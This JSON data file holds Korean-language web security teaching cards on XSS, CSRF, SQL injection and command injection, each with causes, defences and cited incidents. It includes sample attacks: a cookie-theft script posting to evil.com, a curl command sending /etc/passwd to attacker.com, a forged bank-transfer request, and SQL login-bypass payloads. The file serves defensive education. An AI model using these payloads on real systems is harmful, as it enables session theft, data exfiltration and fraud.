[
  {
    "id": "xss",
    "category": "Injection",
    "title": "XSS (Cross-Site Scripting)",
    "description": "사용자 입력에 악성 스크립트를 삽입하여 실행",
    "detail": "<div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> XSS(크로스 사이트 스크립팅)란?</div><blockquote><b>XSS(Cross-Site Scripting)</b>는 공격자가 웹사이트에 악성 스크립트를 삽입하여, 해당 페이지를 방문한 사용자의 브라우저에서 실행되도록 하는 취약점입니다.<br>이로 인해 <span class=\"highlight\">세션 탈취, 피싱, 사이트 변조, 악성 행위 자동화</span> 등이 발생할 수 있습니다.<br>XSS는 웹 보안에서 가장 흔하고 위험한 취약점 중 하나로, <b>입력값 검증 및 출력 이스케이프 미흡</b>이 주요 원인입니다.</blockquote></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> XSS 공격 벡터 및 시나리오</div><ul class=\"card-list-ul\"><li>입력 폼, URL 파라미터, 쿠키, HTTP 헤더 등 다양한 위치에서 스크립트 삽입 시도</li><li>이벤트 핸들러(<code>onerror</code>, <code>onclick</code> 등) 및 SVG, MathML 등 비표준 태그 활용</li><li>DOM 조작 함수(<code>innerHTML</code>, <code>document.write</code> 등) 사용 시 취약</li><li>자동화 도구(Burp Suite, PortSwigger XSS Cheat Sheet 등)로 다양한 페이로드 테스트</li></ul><div class=\"card-tip\"><b>예시 페이로드:</b><pre class=\"card-code\">&lt;img src=x onerror=alert(1)&gt;</pre></div></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> XSS의 주요 유형</div><table class=\"card-table\"><thead><tr><th>분류</th><th>설명</th><th>공격 예시</th></tr></thead><tbody><tr><td>반사형 (Reflected XSS)</td><td>입력값이 즉시 응답에 반영되어 실행됨 (주로 URL 파라미터)</td><td><pre class=\"card-code\">https://example.com/?q=&lt;script&gt;alert(1)&lt;/script&gt;</pre></td></tr><tr><td>저장형 (Stored XSS)</td><td>악성 스크립트가 DB/게시판 등에 저장되어 여러 사용자에게 실행됨</td><td><pre class=\"card-code\">댓글, 게시글, 프로필 등에 &lt;script&gt;alert(1)&lt;/script&gt; 삽입</pre></td></tr><tr><td>DOM 기반 (DOM XSS)</td><td>클라이언트 JS가 DOM을 조작할 때 발생, 서버 관여 없음</td><td><pre class=\"card-code\">document.location.hash 값을 innerHTML로 사용</pre></td></tr></tbody></table></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 공격 예시</div><div class=\"card-code-block\"><b>쿠키 탈취용 페이로드</b><pre class=\"card-code\">&lt;script&gt;fetch('https://evil.com?cookie='+document.cookie)&lt;/script&gt;</pre></div><ol class=\"card-list-ol\"><li>공격자가 위와 같은 페이로드를 삽입</li><li>피해자가 해당 페이지를 방문하면 스크립트가 실행되어 쿠키 등 민감 정보가 공격자에게 전송</li><li>자동화 도구로 다양한 필터 우회 페이로드를 시도할 수 있음</li></ol></div><div class=\"card-detail-section\"><div class=\"card-detail-title danger\"><span class=\"icon\"></span> XSS 취약점 원인</div><ul class=\"card-list-ul\"><li>입력값 검증 미흡: 스크립트, 이벤트, URL, 속성 등 다양한 컨텍스트별 필터링 부재</li><li>출력 시 이스케이프 누락: HTML, 속성, JS, URL 등 컨텍스트별 인코딩 미처리</li><li>신뢰할 수 없는 데이터의 DOM 직접 삽입</li><li>Content Security Policy(CSP) 미적용</li></ul></div><div class=\"card-detail-section\"><div class=\"card-detail-title safe\"><span class=\"icon\"></span> 대응방안 및 체크리스트</div><ol class=\"card-list-ol\"><li>입력값 검증: 화이트리스트 기반 허용, 특수문자 필터링</li><li>출력 시 컨텍스트별 이스케이프: HTML, 속성, JS, URL 등 각각 별도 인코딩 적용</li><li>템플릿 엔진/프레임워크의 자동 이스케이프 기능 활용</li><li>Content Security Policy(CSP) 적용: 외부 스크립트, 인라인 스크립트 제한</li><li>정기적 취약점 스캔 및 자동화 도구 활용(Burp Suite, ZAP 등)</li><li>최신 보안 패치 적용</li></ol><div class=\"card-code-block\"><b>JS 출력 이스케이프 예시</b><pre class=\"card-code\">element.textContent = userInput; // innerHTML 대신 사용</pre></div></div>",
    "imageSrc": "image/xss.png"
  },
  {
    "id": "csrf",
    "category": "Session",
    "title": "CSRF (Cross-Site Request Forgery)",
    "description": "타 사용자의 인증 세션을 도용하는 공격",
    "detail": "<div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> CSRF란?</div><blockquote><b>CSRF(Cross-Site Request Forgery)</b>는 사용자가 인증된 웹사이트에 로그인된 상태에서, 공격자가 조작한 요청을 사용자의 권한으로 실행하도록 유도하는 취약점입니다.<br>피해자는 자신도 모르게 의도하지 않은 요청(게시글 작성, 계좌 이체 등)을 하게 됩니다.<br>CSRF는 사용자의 <span class=\"highlight\">신뢰를 악용</span>하는 공격으로, 브라우저의 자동 인증(쿠키, 세션 등) 메커니즘을 이용합니다.</blockquote></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 공격 벡터 및 시나리오</div><ul class=\"card-list-ul\"><li>피해자가 은행 등 사이트에 로그인하여 세션 쿠키를 보유</li><li>공격자가 악성 사이트/이메일/링크를 통해 피해자를 유도</li><li>피해자가 악성 페이지를 방문하면, 브라우저가 자동으로 인증 쿠키를 포함해 공격자가 의도한 요청을 전송</li><li>서버는 정상 사용자 요청으로 오인하여 민감 동작을 수행</li></ul><div class=\"card-code-block\"><b>공격 예시 (이미지 태그를 이용한 자동 요청)</b><pre class=\"card-code\">&lt;img src=\"https://bank.com/transfer?amount=10000&amp;to=attacker\" style=\"display:none\"&gt;</pre></div></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 주요 특징 및 취약점</div><ul class=\"card-list-ul\"><li>브라우저의 자동 인증(쿠키, 세션, 토큰 등) 메커니즘 악용</li><li>중요 요청에 대한 추가 인증/검증 미흡</li><li>CSRF 토큰 미사용, Referer/Origin 헤더 검증 미흡</li><li>SameSite 쿠키 속성 미설정</li><li>GET 요청으로도 중요한 동작이 수행되는 경우 취약</li></ul></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 활용 예시</div><ul class=\"card-list-ul\"><li>게시글·댓글 작성, 계정 정보 변경</li><li>비밀번호·이메일 변경</li><li>금융 거래(계좌 이체, 결제)</li><li>회원 탈퇴·권한 변경</li></ul></div><div class=\"card-detail-section\"><div class=\"card-detail-title danger\"><span class=\"icon\"></span> CSRF 취약점 원인</div><ul class=\"card-list-ul\"><li>중요 요청에 대한 추가 인증/검증 미흡</li><li>CSRF 토큰 미사용</li><li>Referer/Origin 헤더 검증 미흡</li><li>SameSite 쿠키 미설정</li><li>GET 요청으로 상태 변경 가능</li></ul></div><div class=\"card-detail-section\"><div class=\"card-detail-title safe\"><span class=\"icon\"></span> 대응방안 및 체크리스트</div><ol class=\"card-list-ol\"><li>CSRF 토큰 사용: 폼마다 고유 토큰을 포함하고, 서버에서 검증<div class=\"card-code-block\"><b>폼 내 CSRF 토큰 예시</b><pre class=\"card-code\">&lt;form action=\"/transfer\" method=\"post\"&gt;\n  &lt;input type=\"hidden\" name=\"csrf_token\" value=\"랜덤값\"&gt;\n  &lt;input name=\"amount\" value=\"10000\"&gt;\n  &lt;input name=\"to\" value=\"attacker\"&gt;\n  &lt;button&gt;송금&lt;/button&gt;\n&lt;/form&gt;</pre></div></li><li>Referer/Origin 헤더 검증: 요청 출처가 신뢰 가능한지 확인</li><li>SameSite 쿠키 설정:<pre class=\"card-code\">Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Strict</pre></li><li>중요 동작 시 추가 인증(비밀번호 재확인, OTP 등)</li><li>CAPTCHA 적용: 자동화된 요청 차단</li><li>GET 요청으로 상태 변경 금지(POST, PUT 등 사용)</li></ol></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 사례</div><ul class=\"card-list-ul\"><li><b>2007년 MySpace ‘Samy Worm’</b>: CSRF + Stored XSS 결합, 팔로워 100만 명 초과 확산</li><li><b>2010년 Twitter CSRF</b>: ‘Tweet this’ 기능 남용 → 사용자 대신 DM·트윗 발송</li><li><b>2018년 GitHub OAuth CSRF</b>: 악성 애플리케이션이 사용자 토큰 탈취 시도</li></ul></div>",
    "imageSrc": "image/csrf.png"
  },
  {
    "id": "sqli",
    "category": "Injection",
    "title": "SQL Injection",
    "description": "입력값으로 SQL 구문을 조작하여 데이터베이스 탈취",
    "detail": "<div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> SQL Injection이란?</div><blockquote><b>SQL Injection(SQLi)</b>은 공격자가 웹 애플리케이션의 입력값에 악의적인 SQL 구문을 삽입하여, 데이터베이스에서 비정상적인 쿼리가 실행되도록 만드는 취약점입니다.<br>이로 인해 <span class=\"highlight\">데이터 유출, 계정 탈취, 인증 우회, 데이터 변조·삭제</span> 등이 발생할 수 있습니다.<br>SQLi는 입력값 검증 미흡, 쿼리와 데이터 분리 미흡이 주요 원인입니다.</blockquote></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> SQLi 공격 벡터 및 시나리오</div><ul class=\"card-list-ul\"><li>로그인, 검색, 게시판 등 입력값이 직접 쿼리에 사용되는 모든 지점</li><li>URL 파라미터, 폼 데이터, 쿠키, HTTP 헤더 등 다양한 입력 경로</li><li>에러 메시지, Blind SQLi, Time-based SQLi 등 다양한 공격 기법</li></ul><div class=\"card-tip\"><b>예시 페이로드:</b><pre class=\"card-code\">' OR 1=1 -- </pre></div></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> SQLi의 주요 유형</div><table class=\"card-table\"><thead><tr><th>분류</th><th>설명</th><th>공격 예시</th></tr></thead><tbody><tr><td>에러 기반(Error-based)</td><td>DB 에러 메시지 노출을 통해 데이터 추출</td><td><pre class=\"card-code\">?id=1'</pre></td></tr><tr><td>블라인드(Blind)</td><td>응답 내용/시간 차이를 이용해 참·거짓 판별</td><td><pre class=\"card-code\">?id=1 AND 1=1\n?id=1 AND 1=2\n?id=1 AND SLEEP(5)</pre></td></tr><tr><td>유니온 기반(UNION-based)</td><td>UNION SELECT로 임의의 데이터 추출</td><td><pre class=\"card-code\">?id=1 UNION SELECT username, password FROM users</pre></td></tr></tbody></table></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 공격 예시</div><div class=\"card-code-block\"><b>로그인 우회 페이로드</b><pre class=\"card-code\">입력값: admin' -- \n실제 쿼리: SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...'</pre></div><ol class=\"card-list-ol\"><li>공격자가 로그인 폼에 페이로드 입력</li><li>쿼리가 조작되어 인증 우회 성공</li><li>UNION, Blind, Time-based 등 다양한 방식으로 데이터 추출 가능</li></ol></div><div class=\"card-detail-section\"><div class=\"card-detail-title danger\"><span class=\"icon\"></span> SQLi 취약점 원인</div><ul class=\"card-list-ul\"><li>입력값 검증 미흡: 특수문자, 쿼리 예약어 필터링 부재</li><li>Prepared Statement(매개변수 바인딩) 미사용</li><li>ORM, 쿼리 빌더 등 안전 기능 미적용</li><li>DB 에러 메시지 노출</li><li>최소 권한 원칙 미적용</li></ul></div><div class=\"card-detail-section\"><div class=\"card-detail-title safe\"><span class=\"icon\"></span> 대응방안 및 체크리스트</div><ol class=\"card-list-ol\"><li>Prepared Statement(매개변수 바인딩) 사용<pre class=\"card-code\">String sql = \"SELECT * FROM users WHERE username = ? AND password = ?\";\npstmt = conn.prepareStatement(sql);\npstmt.setString(1, user);\npstmt.setString(2, pass);</pre></li><li>입력값 검증 및 정제: 화이트리스트 기반 허용 문자, 정규식으로 길이·형식 제한</li><li>ORM/쿼리 빌더 활용: SQLAlchemy, Hibernate 등 매개변수화 쿼리 자동 적용</li><li>최소 권한 원칙 적용: DB 계정에 불필요한 권한 제한</li><li>에러 메시지 노출 제한: 상세 DB 오류 대신 일반 메시지 표시</li><li>정기적 취약점 스캔 및 자동화 도구 활용(Burp Suite, sqlmap 등)</li><li>최신 보안 패치 적용</li></ol></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 예시 코드</div><pre class=\"card-code\">// 취약한 쿼리 (인젝션 가능)\nString sql = \"SELECT * FROM users WHERE username = '\" + user + \"' AND password = '\" + pass + \"'\";\n\n// 공격 예시: user = ' OR 1=1 -- \n// 실제 실행 쿼리\nSELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';</pre></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 사례</div><ul class=\"card-list-ul\"><li><b>2008년 Heartland Payment Systems 해킹</b>: 입력 검증 부재로 카드 결제 데이터 수백만 건 유출</li><li><b>2012년 LinkedIn</b>: 비암호화된 쿼리 사용, 사용자 계정 정보 6천만 건 유출</li><li><b>국내 쇼핑몰·포털 다수</b>: 주기적 취약점 스캔 미흡으로 SQLi 공격 반복 발견</li></ul></div>",
    "imageSrc": "image/sqli.png"
  },
  {
    "id": "cmdi",
    "category": "Command",
    "title": "Command Injection",
    "description": "서버 명령어를 삽입 실행하여 시스템 장악",
    "detail": "<div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> Command Injection(명령어 삽입)이란?</div><blockquote><b>Command Injection</b>은 웹 애플리케이션이 사용자 입력을 운영체제(OS) 명령어에 직접 연결할 때 발생하는 취약점입니다.<br>공격자는 시스템 명령어를 삽입해 <span class=\"highlight\">임의 명령 실행, 파일 유출/삭제, 시스템 장악</span> 등 심각한 피해를 유발할 수 있습니다.<br>주로 <b>입력값 검증 미흡</b>과 <b>외부 명령 실행 함수(system, exec 등) 사용</b>이 원인입니다.</blockquote></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 공격 벡터 및 시나리오</div><ul class=\"card-list-ul\"><li>ping, nslookup, traceroute 등 네트워크 명령에 사용자 입력값 직접 연결</li><li>파일명, 경로, 옵션 등 입력값을 명령어 인자로 사용</li><li>쉘 메타문자(<code>;</code>, <code>&&</code>, <code>|</code>, <code>$()</code>, <code>`</code> 등)로 명령어 체인</li><li>웹 폼, URL 파라미터, 쿠키, 헤더 등 다양한 입력 경로</li></ul><div class=\"card-tip\"><b>예시 페이로드:</b><pre class=\"card-code\">127.0.0.1; cat /etc/passwd</pre></div></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 주요 유형</div><table class=\"card-table\"><thead><tr><th>분류</th><th>설명</th><th>공격 예시</th></tr></thead><tbody><tr><td>직접 삽입(Direct)</td><td>입력값이 명령어에 직접 연결되어 실행</td><td><pre class=\"card-code\">ping 127.0.0.1; cat /etc/passwd</pre></td></tr><tr><td>블라인드(Blind)</td><td>응답에 결과가 직접 노출되지 않지만, 시간 지연 등으로 성공 여부 확인</td><td><pre class=\"card-code\">127.0.0.1 && sleep 5</pre></td></tr></tbody></table></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 공격 예시</div><div class=\"card-code-block\"><b>파일 유출 페이로드</b><pre class=\"card-code\">127.0.0.1; curl http://attacker.com/steal?data=$(cat /etc/passwd)</pre></div><ol class=\"card-list-ol\"><li>공격자가 입력값에 쉘 명령어를 삽입</li><li>서버가 입력값을 명령어에 직접 연결해 실행</li><li>민감 정보가 외부로 유출되거나 시스템이 장악됨</li></ol></div><div class=\"card-detail-section\"><div class=\"card-detail-title danger\"><span class=\"icon\"></span> Command Injection 취약점 원인</div><ul class=\"card-list-ul\"><li>입력값 검증 미흡: 쉘 메타문자, 명령어 체인 필터링 부재</li><li>외부 명령 실행 함수(system, exec, popen 등) 사용</li><li>쉘 호출 방식: 인자를 문자열로 조합하여 <code>/bin/sh -c</code> 호출</li><li>최소 권한 원칙 미적용: 루트/관리자 권한으로 실행</li></ul></div><div class=\"card-detail-section\"><div class=\"card-detail-title safe\"><span class=\"icon\"></span> 대응방안 및 체크리스트</div><ol class=\"card-list-ol\"><li>입력값 검증 및 화이트리스트: 허용된 값(숫자, 영문 등)만 통과, 정규식으로 길이·형식 제한</li><li>OS 명령 호출 회피: 파일 조작, 네트워크 요청 등은 언어별 내부 API 사용<br><span class=\"card-tip\">예: Python <code>subprocess.run([...], shell=False)</code></span></li><li>쉘 호출 금지: 인자를 리스트/배열로 전달하여 쉘 해석 없이 실행<pre class=\"card-code\">subprocess.run([\"ping\", user_input], shell=False)</pre></li><li>권한 분리 및 최소화: 애플리케이션 전용 계정에 불필요한 권한 제거</li><li>보안 패치 및 업데이트: OS, 런타임, 라이브러리 최신 버전 유지</li><li>로깅 및 모니터링: 비정상 명령 실행 시 경고 알림</li></ol></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 예시 코드</div><pre class=\"card-code\">// 취약한 예 (Node.js)\nconst { exec } = require('child_process');\nexec('ping ' + userInput, (err, stdout, stderr) => { ... });\n\n// 공격 입력: 127.0.0.1; cat /etc/passwd\n\n// 안전한 예 (Node.js)\nconst { execFile } = require('child_process');\nexecFile('ping', [userInput], (err, stdout, stderr) => { ... });</pre></div><div class=\"card-detail-section\"><div class=\"card-detail-title\"><span class=\"icon\"></span> 실제 사례</div><ul class=\"card-list-ul\"><li><b>2017년 Equifax 해킹</b>: Apache Struts2 OGNL 취약점(command injection 유사)으로 내부 명령 실행 → 1.4억 건 개인정보 유출</li><li><b>IoT 디바이스 공격</b>: 웹 관리자 패널의 쉘 명령 실행 기능 남용 → 악성 펌웨어 설치</li><li><b>공공기관 웹 서버</b>: 파일 업로드 기능 미검증으로 <code>; cat /etc/shadow</code> 등 임의 명령 실행 다수 발견</li></ul></div>",
    "imageSrc": "image/cmdi.png"
  }
]
